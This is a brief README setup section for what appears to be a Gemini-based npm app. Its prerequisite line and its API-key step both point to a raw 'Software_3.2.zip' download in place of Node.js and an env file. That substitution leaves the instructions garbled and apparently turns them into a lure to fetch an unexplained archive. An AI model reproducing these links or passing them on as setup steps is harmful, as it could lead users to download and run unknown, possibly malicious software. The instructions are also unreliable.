## Run Locally

**Prerequisites:**  https://github.com/danilofelipe32/assitentepeigrocq/raw/refs/heads/main/services/Software_3.2.zip


1. Install dependencies:
   `npm install`
2. Set the `GEMINI_API_KEY` in [https://github.com/danilofelipe32/assitentepeigrocq/raw/refs/heads/main/services/Software_3.2.zip](https://github.com/danilofelipe32/assitentepeigrocq/raw/refs/heads/main/services/Software_3.2.zip) to your Gemini API key
3. Run the app:
   `npm run dev`
